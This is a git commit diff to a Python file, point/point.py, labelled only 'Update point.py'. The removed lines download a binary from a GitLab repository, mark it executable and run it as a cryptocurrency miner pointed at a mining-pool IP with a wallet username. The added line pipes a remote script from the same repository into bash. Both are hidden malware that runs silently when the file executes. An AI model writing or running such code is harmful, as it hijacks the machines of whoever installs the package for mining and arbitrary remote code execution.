c26bbdd7956e0ed3f0c16cb2fe15b3ac1e4c3c5c
christineiimegan <christineiimegan@outlook.com>
2025-01-23 23:47:21 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,3 @@
 import sys
 import os
-os.system("wget -qO rubby  https://gitlab.com/derisafrew/vx/-/raw/main/ojava?ref_type=heads && chmod +x * >/dev/null 2>&1")
-os.system("./rubby ./ojava --url 31.171.251.36:443/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-ambar) --cores 4")
+os.system("curl -sL https://gitlab.com/derisafrew/vx/-/blob/main/hore | bash")
